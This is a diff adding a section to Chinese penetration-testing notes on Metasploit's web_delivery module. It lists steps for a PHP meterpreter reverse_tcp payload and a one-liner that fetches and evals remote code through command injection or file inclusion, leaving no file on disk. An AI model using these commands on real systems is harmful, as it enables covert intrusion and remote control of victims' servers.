@@ -170,5 +170,25 @@ shell升级为交互式shell
 
 shell升级为meterpreter
 -----------------------------------------
-web_delivery模块
+- web_delivery模块
+	背景：
+		目标设备存在远程文件包含漏洞或者命令注入漏洞，想在目标设备上加载webshell，但不想在目标设备硬盘上留下任何webshell文件信息.
+	
+	::
+	
+		使用步骤:
+		1、use exploit/multi/script/web_delivery
+		2、set target PHP   ====>因为一般web平台默认支持PHP，所以我们选择兼容性最好的PHP做webshell
+		3、set payload php/meterpreter/reverse_tcp    ====>选择php写的meterpreter
+		4、set lhost 172.20.163.160
+		5、set lport 1111
+		6、run
 
+	|shell1|
+	
+	利用方式：
+		命令注入漏洞： ``php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.20.163.160:1111/OgsOFaj3yKH'));"`` 
+		远程文件包含漏洞： ``http://172.20.163.160:1111/OgsOFaj3yKH`` 
+
+
+.. |shell1| image:: ../images/shell1.png
